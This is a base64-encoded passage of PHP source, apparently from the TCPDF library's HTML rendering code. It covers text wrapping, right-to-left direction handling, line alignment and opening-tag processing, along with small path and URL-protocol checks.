CAkdG1wX2ZvbnRzdHlsZSwgJHRtcF9mb250c2l6ZSk7CgkJCQkJCQkJCQlpZiAoaXNzZXQoJG5leHRzdHJbMV0pKSB7CgkJCQkJCQkJCQkJJHdyaXRlX2Jsb2NrID0gZmFsc2U7CgkJCQkJCQkJCQl9CgkJCQkJCQkJCX0KCQkJCQkJCQl9CgkJCQkJCQkJKyskbmtleTsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCQlpZiAoKCR3YWRqID4gMCkgQU5EICgoJHN0cmxpbmVsZW4gKyAkd2FkaikgPj0gJGN3YSkpIHsKCQkJCQkJCSR3YWRqID0gMDsKCQkJCQkJCSRuZXh0c3RyID0gVENQREZfU1RBVElDOjpwcmVnU3BsaXQoJy8nLiR0aGlzLT5yZV9zcGFjZVsncCddLicvJywgJHRoaXMtPnJlX3NwYWNlWydtJ10sICRkb21bJGtleV1bJ3ZhbHVlJ10pOwoJCQkJCQkJJG51bWJsa3MgPSBjb3VudCgkbmV4dHN0cik7CgkJCQkJCQlpZiAoJG51bWJsa3MgPiAxKSB7CgkJCQkJCQkJLy8gdHJ5IHRvIHNwbGl0IG9uIGJsYW5rIHNwYWNlcwoJCQkJCQkJCSR3YWRqID0gKCRjd2EgLSAkc3RybGluZWxlbiArICR0aGlzLT5HZXRTdHJpbmdXaWR0aCgkbmV4dHN0clsoJG51bWJsa3MgLSAxKV0pKTsKCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJLy8gc2V0IHRoZSBlbnRpcmUgYmxvY2sgb24gbmV3IGxpbmUKCQkJCQkJCQkkd2FkaiA9ICR0aGlzLT5HZXRTdHJpbmdXaWR0aCgkbmV4dHN0clswXSk7CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQkJLy8gY2hlY2sgZm9yIHJldmVyc2VkIHRleHQgZGlyZWN0aW9uCgkJCQkJCWlmICgoJHdhZGogPiAwKSBBTkQgKCgkdGhpcy0+cnRsIEFORCAoJHRoaXMtPnRtcHJ0bCA9PT0gJ0wnKSkgT1IgKCEkdGhpcy0+cnRsIEFORCAoJHRoaXMtPnRtcHJ0bCA9PT0gJ1InKSkpKSB7CgkJCQkJCQkvLyBMVFIgdGV4dCBvbiBSVEwgZGlyZWN0aW9uIG9yIFJUTCB0ZXh0IG9uIExUUiBkaXJlY3Rpb24KCQkJCQkJCSRyZXZlcnNlX2RpciA9IHRydWU7CgkJCQkJCQkkdGhpcy0+cnRsID0gISR0aGlzLT5ydGw7CgkJCQkJCQkkcmV2c2hpZnQgPSAoJHN0cmxpbmVsZW4gKyAkd2FkaiArIDAuMDAwMDAxKTsgLy8gYWRkIGxpdHRsZSBxdWFudGl0eSBmb3Igcm91bmRpbmcgcHJvYmxlbXMKCQkJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCQkJJHRoaXMtPnggKz0gJHJldnNoaWZ0OwoJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkkdGhpcy0+eCAtPSAkcmV2c2hpZnQ7CgkJCQkJCQl9CgkJCQkJCQkkeHdzID0gJHRoaXMtPng7CgkJCQkJCX0KCQkJCQkJLy8gKioqKioqIHdyaXRlIG9ubHkgdW50aWwgdGhlIGVuZCBvZiB0aGUgbGluZSBhbmQgZ2V0IHRoZSByZXN0ICoqKioqKgoJCQkJCQkkc3RycmVzdCA9ICR0aGlzLT5Xcml0ZSgkdGhpcy0+bGFzdGgsICRkb21bJGtleV1bJ3ZhbHVlJ10sICcnLCAkd2ZpbGwsICcnLCBmYWxzZSwgMCwgdHJ1ZSwgJGZpcnN0YmxvY2ssIDAsICR3YWRqKTsKCQkJCQkJLy8gcmVzdG9yZSBkZWZhdWx0IGRpcmVjdGlvbgoJCQkJCQlpZiAoJHJldmVyc2VfZGlyIEFORCAoJHdhZGogPT0gMCkpIHsKCQkJCQkJCSR0aGlzLT54ID0gJHh3czsgLy8gQHBocHN0YW4taWdub3JlLWxpbmUKCQkJCQkJCSR0aGlzLT5ydGwgPSAhJHRoaXMtPnJ0bDsKCQkJCQkJCSRyZXZlcnNlX2RpciA9IGZhbHNlOwoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQkJJHRoaXMtPnRleHRpbmRlbnQgPSAwOwoJCQkJaWYgKHN0cmxlbigkc3RycmVzdCkgPiAwKSB7CgkJCQkJLy8gc3RvcmUgdGhlIHJlbWFpbmluZyBzdHJpbmcgb24gdGhlIHByZXZpb3VzICRrZXkgcG9zaXRpb24KCQkJCQkkdGhpcy0+bmV3bGluZSA9IHRydWU7CgkJCQkJaWYgKCRzdHJyZXN0ID09ICRkb21bJGtleV1bJ3ZhbHVlJ10pIHsKCQkJCQkJLy8gdXNlZCB0byBhdm9pZCBpbmZpbml0ZSBsb29wCgkJCQkJCSsrJGxvb3A7CgkJCQkJfSBlbHNlIHsKCQkJCQkJJGxvb3AgPSAwOwoJCQkJCX0KCQkJCQkkZG9tWyRrZXldWyd2YWx1ZSddID0gJHN0cnJlc3Q7CgkJCQkJaWYgKCRjZWxsKSB7CgkJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCQkkdGhpcy0+eCAtPSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydSJ107CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkdGhpcy0+eCArPSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydMJ107CgkJCQkJCX0KCQkJCQl9CgkJCQkJaWYgKCRsb29wIDwgMykgewoJCQkJCQktLSRrZXk7CgkJCQkJfQoJCQkJfSBlbHNlIHsKCQkJCQkkbG9vcCA9IDA7CgkJCQkJLy8gYWRkIHRoZSBwb3NpdGl2ZSBmb250IHNwYWNpbmcgb2YgdGhlIGxhc3QgY2hhcmFjdGVyIChpZiBhbnkpCgkJCQkJIGlmICgkdGhpcy0+Zm9udF9zcGFjaW5nID4gMCkgewoJCQkJCSAJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkJCSR0aGlzLT54IC09ICR0aGlzLT5mb250X3NwYWNpbmc7CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkdGhpcy0+eCArPSAkdGhpcy0+Zm9udF9zcGFjaW5nOwoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQl9CgkJCSsrJGtleTsKCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3RhZyddKSBBTkQgJGRvbVska2V5XVsndGFnJ10gQU5EICghaXNzZXQoJGRvbVska2V5XVsnb3BlbmluZyddKSBPUiAhJGRvbVska2V5XVsnb3BlbmluZyddKSBBTkQgaXNzZXQoJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnYXR0cmlidXRlJ11bJ25vYnInXSkgQU5EICgkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydhdHRyaWJ1dGUnXVsnbm9iciddID09ICd0cnVlJykpIHsKCQkJCS8vIGNoZWNrIGlmIHdlIGFyZSBvbiBhIG5ldyBwYWdlIG9yIG9uIGEgbmV3IGNvbHVtbgoJCQkJaWYgKCghJHVuZG8pIEFORCAoKCR0aGlzLT55IDwgJHRoaXMtPnN0YXJ0X3RyYW5zYWN0aW9uX3kpIE9SICgoJGRvbVska2V5XVsndmFsdWUnXSA9PSAndHInKSBBTkQgKCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2VuZHknXSA8ICR0aGlzLT5zdGFydF90cmFuc2FjdGlvbl95KSkpKSB7CgkJCQkJLy8gd2UgYXJlIG9uIGEgbmV3IHBhZ2Ugb3Igb24gYSBuZXcgY29sdW1uIGFuZCB0aGUgdG90YWwgb2JqZWN0IGhlaWdodCBpcyBsZXNzIHRoYW4gdGhlIGF2YWlsYWJsZSB2ZXJ0aWNhbCBzcGFjZS4KCQkJCQkvLyByZXN0b3JlIHByZXZpb3VzIG9iamVjdAoJCQkJCSR0aGlzLT5yb2xsYmFja1RyYW5zYWN0aW9uKHRydWUpOwoJCQkJCS8vIHJlc3RvcmUgcHJldmlvdXMgdmFsdWVzCgkJCQkJZm9yZWFjaCAoJHRoaXNfbWV0aG9kX3ZhcnMgYXMgJHZrZXkgPT4gJHZ2YWwpIHsKCQkJCQkJJCR2a2V5ID0gJHZ2YWw7CgkJCQkJfQoJCQkJCWlmICghZW1wdHkoJGRvbVska2V5XVsndGhlYWQnXSkpIHsKCQkJCQkJJHRoaXMtPmludGhlYWQgPSB0cnVlOwoJCQkJCX0KCQkJCQkvLyBhZGQgYSBwYWdlIChvciB0cmlnIEFjY2VwdFBhZ2VCcmVhaygpIGZvciBtdWx0aWNvbHVtbiBtb2RlKQoJCQkJCSRwcmVfeSA9ICR0aGlzLT55OwoJCQkJCWlmICgoISR0aGlzLT5jaGVja1BhZ2VCcmVhaygkdGhpcy0+UGFnZUJyZWFrVHJpZ2dlciArIDEpKSBBTkQgKCR0aGlzLT55IDwgJHByZV95KSkgewoJCQkJCQkkc3RhcnRsaW5leSA9ICR0aGlzLT55OwoJCQkJCX0KCQkJCQkkdW5kbyA9IHRydWU7IC8vIGF2b2lkIGluZmluaXRlIGxvb3AKCQkJCX0gZWxzZSB7CgkJCQkJJHVuZG8gPSBmYWxzZTsKCQkJCX0KCQkJfQoJCX0gLy8gZW5kIGZvciBlYWNoICRrZXkKCQkvLyBhbGlnbiB0aGUgbGFzdCBsaW5lCgkJaWYgKGlzc2V0KCRzdGFydGxpbmV4KSkgewoJCQkkeXNoaWZ0ID0gKCRtaW5zdGFydGxpbmV5IC0gJHN0YXJ0bGluZXkpOwoJCQlpZiAoKCR5c2hpZnQgPiAwKSBPUiAoJHRoaXMtPnBhZ2UgPiAkc3RhcnRsaW5lcGFnZSkpIHsKCQkJCSR5c2hpZnQgPSAwOwoJCQl9CgkJCSR0X3ggPSAwOwoJCQkvLyB0aGUgbGFzdCBsaW5lIG11c3QgYmUgc2hpZnRlZCB0byBiZSBhbGlnbmVkIGFzIHJlcXVlc3RlZAoJCQkkbGluZXcgPSBhYnMoJHRoaXMtPmVuZGxpbmV4IC0gJHN0YXJ0bGluZXgpOwoJCQlpZiAoJHRoaXMtPmlueG9iaikgewoJCQkJLy8gd2UgYXJlIGluc2lkZSBhbiBYT2JqZWN0IHRlbXBsYXRlCgkJCQkkcHN0YXJ0ID0gc3Vic3RyKCR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnb3V0ZGF0YSddLCAwLCAkc3RhcnRsaW5lcG9zKTsKCQkJCWlmIChpc3NldCgkb3BlbnRhZ3BvcykpIHsKCQkJCQkkbWlkcG9zID0gJG9wZW50YWdwb3M7CgkJCQl9IGVsc2UgewoJCQkJCSRtaWRwb3MgPSAwOwoJCQkJfQoJCQkJaWYgKCRtaWRwb3MgPiAwKSB7CgkJCQkJJHBtaWQgPSBzdWJzdHIoJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydvdXRkYXRhJ10sICRzdGFydGxpbmVwb3MsICgkbWlkcG9zIC0gJHN0YXJ0bGluZXBvcykpOwoJCQkJCSRwZW5kID0gc3Vic3RyKCR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnb3V0ZGF0YSddLCAkbWlkcG9zKTsKCQkJCX0gZWxzZSB7CgkJCQkJJHBtaWQgPSBzdWJzdHIoJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydvdXRkYXRhJ10sICRzdGFydGxpbmVwb3MpOwoJCQkJCSRwZW5kID0gJyc7CgkJCQl9CgkJCX0gZWxzZSB7CgkJCQkkcHN0YXJ0ID0gc3Vic3RyKCR0aGlzLT5nZXRQYWdlQnVmZmVyKCRzdGFydGxpbmVwYWdlKSwgMCwgJHN0YXJ0bGluZXBvcyk7CgkJCQlpZiAoaXNzZXQoJG9wZW50YWdwb3MpIEFORCBpc3NldCgkdGhpcy0+Zm9vdGVybGVuWyRzdGFydGxpbmVwYWdlXSkgQU5EICghJHRoaXMtPkluRm9vdGVyKSkgewoJCQkJCSR0aGlzLT5mb290ZXJwb3NbJHN0YXJ0bGluZXBhZ2VdID0gJHRoaXMtPnBhZ2VsZW5bJHN0YXJ0bGluZXBhZ2VdIC0gJHRoaXMtPmZvb3Rlcmxlblskc3RhcnRsaW5lcGFnZV07CgkJCQkJJG1pZHBvcyA9IG1pbigkb3BlbnRhZ3BvcywgJHRoaXMtPmZvb3RlcnBvc1skc3RhcnRsaW5lcGFnZV0pOwoJCQkJfSBlbHNlaWYgKGlzc2V0KCRvcGVudGFncG9zKSkgewoJCQkJCSRtaWRwb3MgPSAkb3BlbnRhZ3BvczsKCQkJCX0gZWxzZWlmIChpc3NldCgkdGhpcy0+Zm9vdGVybGVuWyRzdGFydGxpbmVwYWdlXSkgQU5EICghJHRoaXMtPkluRm9vdGVyKSkgewoJCQkJCSR0aGlzLT5mb290ZXJwb3NbJHN0YXJ0bGluZXBhZ2VdID0gJHRoaXMtPnBhZ2VsZW5bJHN0YXJ0bGluZXBhZ2VdIC0gJHRoaXMtPmZvb3Rlcmxlblskc3RhcnRsaW5lcGFnZV07CgkJCQkJJG1pZHBvcyA9ICR0aGlzLT5mb290ZXJwb3NbJHN0YXJ0bGluZXBhZ2VdOwoJCQkJfSBlbHNlIHsKCQkJCQkkbWlkcG9zID0gMDsKCQkJCX0KCQkJCWlmICgkbWlkcG9zID4gMCkgewoJCQkJCSRwbWlkID0gc3Vic3RyKCR0aGlzLT5nZXRQYWdlQnVmZmVyKCRzdGFydGxpbmVwYWdlKSwgJHN0YXJ0bGluZXBvcywgKCRtaWRwb3MgLSAkc3RhcnRsaW5lcG9zKSk7CgkJCQkJJHBlbmQgPSBzdWJzdHIoJHRoaXMtPmdldFBhZ2VCdWZmZXIoJHN0YXJ0bGluZXBhZ2UpLCAkbWlkcG9zKTsKCQkJCX0gZWxzZSB7CgkJCQkJJHBtaWQgPSBzdWJzdHIoJHRoaXMtPmdldFBhZ2VCdWZmZXIoJHN0YXJ0bGluZXBhZ2UpLCAkc3RhcnRsaW5lcG9zKTsKCQkJCQkkcGVuZCA9ICcnOwoJCQkJfQoJCQl9CgkJCWlmICgoKCgoJHBsYWxpZ24gPT0gJ0MnKSBPUiAoKCRwbGFsaWduID09ICdSJykgQU5EICghJHRoaXMtPnJ0bCkpIE9SICgoJHBsYWxpZ24gPT0gJ0wnKSBBTkQgKCR0aGlzLT5ydGwpKSkpKSkgewoJCQkJLy8gY2FsY3VsYXRlIHNoaWZ0aW5nIGFtb3VudAoJCQkJJHR3ID0gJHc7CgkJCQlpZiAoJHRoaXMtPmxNYXJnaW4gIT0gJHByZXZsTWFyZ2luKSB7CgkJCQkJJHR3ICs9ICgkcHJldmxNYXJnaW4gLSAkdGhpcy0+bE1hcmdpbik7CgkJCQl9CgkJCQlpZiAoJHRoaXMtPnJNYXJnaW4gIT0gJHByZXZyTWFyZ2luKSB7CgkJCQkJJHR3ICs9ICgkcHJldnJNYXJnaW4gLSAkdGhpcy0+ck1hcmdpbik7CgkJCQl9CgkJCQkkb25lX3NwYWNlX3dpZHRoID0gJHRoaXMtPkdldFN0cmluZ1dpZHRoKGNocigzMikpOwoJCQkJJG5vID0gMDsgLy8gbnVtYmVyIG9mIHNwYWNlcyBvbiBhIGxpbmUgY29udGFpbmVkIG9uIGEgc2luZ2xlIGJsb2NrCgkJCQlpZiAoJHRoaXMtPmlzUlRMVGV4dERpcigpKSB7IC8vIFJUTAoJCQkJCS8vIHJlbW92ZSBsZWZ0IHNwYWNlIGlmIGV4aXN0CgkJCQkJJHBvczEgPSBUQ1BERl9TVEFUSUM6OnJldnN0cnBvcygkcG1pZCwgJ1soJyk7CgkJCQkJaWYgKCRwb3MxID4gMCkgewoJCQkJCQkkcG9zMSA9IGludHZhbCgkcG9zMSk7CgkJCQkJCWlmICgkdGhpcy0+aXNVbmljb2RlRm9udCgpKSB7CgkJCQkJCQkkcG9zMiA9IGludHZhbChUQ1BERl9TVEFUSUM6OnJldnN0cnBvcygkcG1pZCwgJ1soJy5jaHIoMCkuY2hyKDMyKSkpOwoJCQkJCQkJJHNwYWNlbGVuID0gMjsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSRwb3MyID0gaW50dmFsKFRDUERGX1NUQVRJQzo6cmV2c3RycG9zKCRwbWlkLCAnWygnLmNocigzMikpKTsKCQkJCQkJCSRzcGFjZWxlbiA9IDE7CgkJCQkJCX0KCQkJCQkJaWYgKCRwb3MxID09ICRwb3MyKSB7CgkJCQkJCQkkcG1pZCA9IHN1YnN0cigkcG1pZCwgMCwgKCRwb3MxICsgMikpLnN1YnN0cigkcG1pZCwgKCRwb3MxICsgMiArICRzcGFjZWxlbikpOwoJCQkJCQkJaWYgKHN1YnN0cigkcG1pZCwgJHBvczEsIDQpID09ICdbKCldJykgewoJCQkJCQkJCSRsaW5ldyAtPSAkb25lX3NwYWNlX3dpZHRoOwoJCQkJCQkJfSBlbHNlaWYgKCRwb3MxID09IHN0cnBvcygkcG1pZCwgJ1soJykpIHsKCQkJCQkJCQkkbm8gPSAxOwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJfQoJCQkJfSBlbHNlIHsgLy8gTFRSCgkJCQkJLy8gcmVtb3ZlIHJpZ2h0IHNwYWNlIGlmIGV4aXN0CgkJCQkJJHBvczEgPSBUQ1BERl9TVEFUSUM6OnJldnN0cnBvcygkcG1pZCwgJyldJyk7CgkJCQkJaWYgKCRwb3MxID4gMCkgewoJCQkJCQkkcG9zMSA9IGludHZhbCgkcG9zMSk7CgkJCQkJCWlmICgkdGhpcy0+aXNVbmljb2RlRm9udCgpKSB7CgkJCQkJCQkkcG9zMiA9IGludHZhbChUQ1BERl9TVEFUSUM6OnJldnN0cnBvcygkcG1pZCwgY2hyKDApLmNocigzMikuJyldJykpICsgMjsKCQkJCQkJCSRzcGFjZWxlbiA9IDI7CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkcG9zMiA9IGludHZhbChUQ1BERl9TVEFUSUM6OnJldnN0cnBvcygkcG1pZCwgY2hyKDMyKS4nKV0nKSkgKyAxOwoJCQkJCQkJJHNwYWNlbGVuID0gMTsKCQkJCQkJfQoJCQkJCQlpZiAoJHBvczEgPT0gJHBvczIpIHsKCQkJCQkJCSRwbWlkID0gc3Vic3RyKCRwbWlkLCAwLCAoJHBvczEgLSAkc3BhY2VsZW4pKS5zdWJzdHIoJHBtaWQsICRwb3MxKTsKCQkJCQkJCSRsaW5ldyAtPSAkb25lX3NwYWNlX3dpZHRoOwoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQkJJG1kaWZmID0gKCR0dyAtICRsaW5ldyk7CgkJCQlpZiAoJHBsYWxpZ24gPT0gJ0MnKSB7CgkJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkJJHRfeCA9IC0oJG1kaWZmIC8gMik7CgkJCQkJfSBlbHNlIHsKCQkJCQkJJHRfeCA9ICgkbWRpZmYgLyAyKTsKCQkJCQl9CgkJCQl9IGVsc2VpZiAoJHBsYWxpZ24gPT0gJ1InKSB7CgkJCQkJLy8gcmlnaHQgYWxpZ25tZW50IG9uIExUUiBkb2N1bWVudAoJCQkJCSR0X3ggPSAkbWRpZmY7CgkJCQl9IGVsc2VpZiAoJHBsYWxpZ24gPT0gJ0wnKSB7CgkJCQkJLy8gbGVmdCBhbGlnbm1lbnQgb24gUlRMIGRvY3VtZW50CgkJCQkJJHRfeCA9IC0kbWRpZmY7CgkJCQl9CgkJCX0gLy8gZW5kIGlmIHN0YXJ0bGluZXgKCQkJaWYgKCgkdF94ICE9IDApIE9SICgkeXNoaWZ0IDwgMCkpIHsKCQkJCS8vIHNoaWZ0IHRoZSBsaW5lCgkJCQkkdHJ4ID0gc3ByaW50ZignMSAwIDAgMSAlRiAlRiBjbScsICgkdF94ICogJHRoaXMtPmspLCAoJHlzaGlmdCAqICR0aGlzLT5rKSk7CgkJCQkkcHN0YXJ0IC49ICJcbnFcbiIuJHRyeC4iXG4iLiRwbWlkLiJcblFcbiI7CgkJCQkkZW5kbGluZXBvcyA9IHN0cmxlbigkcHN0YXJ0KTsKCQkJCWlmICgkdGhpcy0+aW54b2JqKSB7CgkJCQkJLy8gd2UgYXJlIGluc2lkZSBhbiBYT2JqZWN0IHRlbXBsYXRlCgkJCQkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydvdXRkYXRhJ10gPSAkcHN0YXJ0LiRwZW5kOwoJCQkJCWZvcmVhY2ggKCR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnYW5ub3RhdGlvbnMnXSBhcyAkcGFrID0+ICRwYWMpIHsKCQkJCQkJaWYgKCRwYWsgPj0gJHBhc2spIHsKCQkJCQkJCSR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnYW5ub3RhdGlvbnMnXVskcGFrXVsneCddICs9ICR0X3g7CgkJCQkJCQkkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ2Fubm90YXRpb25zJ11bJHBha11bJ3knXSAtPSAkeXNoaWZ0OwoJCQkJCQl9CgkJCQkJfQoJCQkJfSBlbHNlIHsKCQkJCQkkdGhpcy0+c2V0UGFnZUJ1ZmZlcigkc3RhcnRsaW5lcGFnZSwgJHBzdGFydC4kcGVuZCk7CgkJCQkJLy8gc2hpZnQgdGhlIGFubm90YXRpb25zIGFuZCBsaW5rcwoJCQkJCWlmIChpc3NldCgkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+cGFnZV0pKSB7CgkJCQkJCWZvcmVhY2ggKCR0aGlzLT5QYWdlQW5ub3RzWyR0aGlzLT5wYWdlXSBhcyAkcGFrID0+ICRwYWMpIHsKCQkJCQkJCWlmICgkcGFrID49ICRwYXNrKSB7CgkJCQkJCQkJJHRoaXMtPlBhZ2VBbm5vdHNbJHRoaXMtPnBhZ2VdWyRwYWtdWyd4J10gKz0gJHRfeDsKCQkJCQkJCQkkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+cGFnZV1bJHBha11bJ3knXSAtPSAkeXNoaWZ0OwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQkJJHRoaXMtPnkgLT0gJHlzaGlmdDsKCQkJCSR5c2hpZnQgPSAwOwoJCQl9CgkJfQoJCS8vIHJlc3RvcmUgcHJldmlvdXMgdmFsdWVzCgkJJHRoaXMtPnNldEdyYXBoaWNWYXJzKCRndmFycyk7CgkJaWYgKCR0aGlzLT5udW1fY29sdW1ucyA+IDEpIHsKCQkJJHRoaXMtPnNlbGVjdENvbHVtbigpOwoJCX0gZWxzZWlmICgkdGhpcy0+cGFnZSA+ICRwcmV2UGFnZSkgewoJCQkkdGhpcy0+bE1hcmdpbiA9ICR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnb2xtJ107CgkJCSR0aGlzLT5yTWFyZ2luID0gJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydvcm0nXTsKCQl9CgkJLy8gcmVzdG9yZSBwcmV2aW91cyBsaXN0IHN0YXRlCgkJJHRoaXMtPmNlbGxfaGVpZ2h0X3JhdGlvID0gJHByZXZfY2VsbF9oZWlnaHRfcmF0aW87CgkJJHRoaXMtPmxpc3RudW0gPSAkcHJldl9saXN0bnVtOwoJCSR0aGlzLT5saXN0b3JkZXJlZCA9ICRwcmV2X2xpc3RvcmRlcmVkOwoJCSR0aGlzLT5saXN0Y291bnQgPSAkcHJldl9saXN0Y291bnQ7CgkJJHRoaXMtPmxpc3BhY2VyID0gJHByZXZfbGlzcGFjZXI7CgkJaWYgKCRsbiBBTkQgKCEoJGNlbGwgQU5EICgkZG9tWyRrZXktMV1bJ3ZhbHVlJ10gPT0gJ3RhYmxlJykpKSkgewoJCQkkdGhpcy0+TG4oJHRoaXMtPmxhc3RoKTsKCQkJaWYgKCgkdGhpcy0+eSA8ICRtYXhib3R0b21saW5leSkgQU5EICgkc3RhcnRsaW5lcGFnZSA9PSAkdGhpcy0+cGFnZSkpIHsKCQkJCSR0aGlzLT55ID0gJG1heGJvdHRvbWxpbmV5OwoJCQl9CgkJfQoJCXVuc2V0KCRkb20pOwoJfQoKCS8qKgoJICogQ2hlY2sgaWYgdGhlIHBhdGggaXMgcmVsYXRpdmUuCgkgKiBAcGFyYW0gc3RyaW5nICRwYXRoIHBhdGggdG8gY2hlY2sKCSAqIEByZXR1cm4gYm9vbGVhbiB0cnVlIGlmIHRoZSBwYXRoIGlzIHJlbGF0aXZlCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNi45LjEKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIGlzUmVsYXRpdmVQYXRoKCRwYXRoKSB7CgkJcmV0dXJuIChzdHJwb3Moc3RyX2lyZXBsYWNlKCclMkUnLCAnLicsICR0aGlzLT51bmh0bWxlbnRpdGllcygkcGF0aCkpLCAnLi4nKSAhPT0gZmFsc2UpOwoJfQoKCS8qKgoJICogQ2hlY2sgaWYgaXQgY29udGFpbnMgYSBub24tYWxsb3dlZCBleHRlcm5hbCBwcm90b2NvbC4KCSAqIEBwYXJhbSBzdHJpbmcgJHBhdGggcGF0aCB0byBjaGVjawoJICogQHJldHVybiBib29sZWFuIHRydWUgaWYgdGhlIHByb3RvY29sIGlzIG5vdCBhbGxvd2VkLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDYuOS4zCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBoYXNFeHRGb3JiaWRkZW5Qcm90b2NvbCgkcGF0aCkgewoJCXJldHVybiAoKHN0cnBvcygkcGF0aCwgJzovLycpICE9PSBmYWxzZSkKCQkJJiYgKHByZWdfbWF0Y2goJ3xeaHR0cHM/Oi8vfCcsICRwYXRoKSAhPT0gMSkpOwoJfQoKCS8qKgoJICogUHJvY2VzcyBvcGVuaW5nIHRhZ3MuCgkgKiBAcGFyYW0gYXJyYXkgJGRvbSBodG1sIGRvbSBhcnJheQoJICogQHBhcmFtIGludCAka2V5IGN1cnJlbnQgZWxlbWVudCBpZAoJICogQHBhcmFtIGJvb2xlYW4gJGNlbGwgaWYgdHJ1ZSBhZGQgdGhlIGRlZmF1bHQgbGVmdCAob3IgcmlnaHQgaWYgUlRMKSBwYWRkaW5nIHRvIGVhY2ggbmV3IGxpbmUgKGRlZmF1bHQgZmFsc2UpLgoJICogQHJldHVybiBhcnJheSAkZG9tCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBvcGVuSFRNTFRhZ0hhbmRsZXIoJGRvbSwgJGtleSwgJGNlbGwpIHsKCQkkdGFnID0gJGRvbVska2V5XTsKCQkkcGFyZW50ID0gJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXTsKCQkkZmlyc3R0YWcgPSAoJGtleSA9PSAxKTsKCQkvLyBjaGVjayBmb3IgdGV4dCBkaXJlY3Rpb24gYXR0cmlidXRlCgkJaWYgKGlzc2V0KCR0YWdbJ2RpciddKSkgewoJCQkkdGhpcy0+c2V0VGVtcFJUTCgkdGFnWydkaXInXSk7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPnRtcHJ0bCA9IGZhbHNlOwoJCX0KCQlpZiAoJHRhZ1snYmxvY2snXSkgewoJCQkkaGJ6ID0gMDsgLy8gZGlzdGFuY2UgZnJvbSB5IHRvIGxpbmUgYm90dG9tCgkJCSRoYiA9IDA7IC8vIHZlcnRpY2FsIHNwYWNlIGJldHdlZW4gYmxvY2sgdGFncwoJCQkvLyBjYWxjdWxhdGUgdmVydGljYWwgc3BhY2UgZm9yIGJsb2NrIHRhZ3MKCQkJaWYgKGlzc2V0KCR0aGlzLT50YWd2c3BhY2VzWyR0YWdbJ3ZhbHVlJ11dWzBdWydoJ10pICYmICFlbXB0eSgkdGhpcy0+dGFndnNwYWNlc1skdGFnWyd2YWx1ZSddXVswXVsnaCddKSAmJiAoJHRoaXMtPnRhZ3ZzcGFjZXNbJHRhZ1sndmFsdWUnXV1bMF1bJ2gnXSA+PSAwKSkgewoJCQkJJGN1cl9oID0gJHRoaXMtPnRhZ3ZzcGFjZXNbJHRhZ1sndmFsdWUnXV1bMF1bJ2gnXTsKCQkJfSBlbHNlaWYgKGlzc2V0KCR0YWdbJ2ZvbnRzaXplJ10pKSB7CgkJCQkkY3VyX2ggPSAkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkdGFnWydmb250c2l6ZSddIC8gJHRoaXMtPmspOwoJCQl9IGVsc2UgewoJCQkJJGN1cl9oID0gJHRoaXMtPmdldENlbGxIZWlnaHQoJHRoaXMtPkZvbnRTaXplKTsKCQkJfQoJCQlpZiAoaXNzZXQoJHRoaXMtPnRhZ3ZzcGFjZXNbJHRhZ1sndmFsdWUnXV1bMF1bJ24nXSkpIHsKCQkJCSRvbiA9ICR0aGlzLT50YWd2c3BhY2VzWyR0YWdbJ3ZhbHVlJ11dWzBdWyduJ107CgkJCX0gZWxzZWlmIChwcmVnX21hdGNoKCcvW2hdWzAtOV0vJywgJHRhZ1sndmFsdWUnXSkgPiAwKSB7CgkJCQkkb24gPSAwLjY7CgkJCX0gZWxzZSB7CgkJCQkkb24gPSAxOwoJCQl9CgkJCWlmICgoIWlzc2V0KCR0aGlzLT50YWd2c3BhY2VzWyR0YWdbJ3ZhbHVlJ11dKSkgQU5EIChpbl9hcnJheSgkdGFnWyd2YWx1ZSddLCBhcnJheSgnZGl2JywgJ2R0JywgJ2RkJywgJ2xpJywgJ2JyJywgJ2hyJykpKSkgewoJCQkJJGhiID0gMDsKCQkJfSBlbHNlIHsKCQkJCSRoYiA9ICgkb24gKiAkY3VyX2gpOwoJCQl9CgkJCWlmICgoJHRoaXMtPmh0bWx2c3BhY2UgPD0gMCk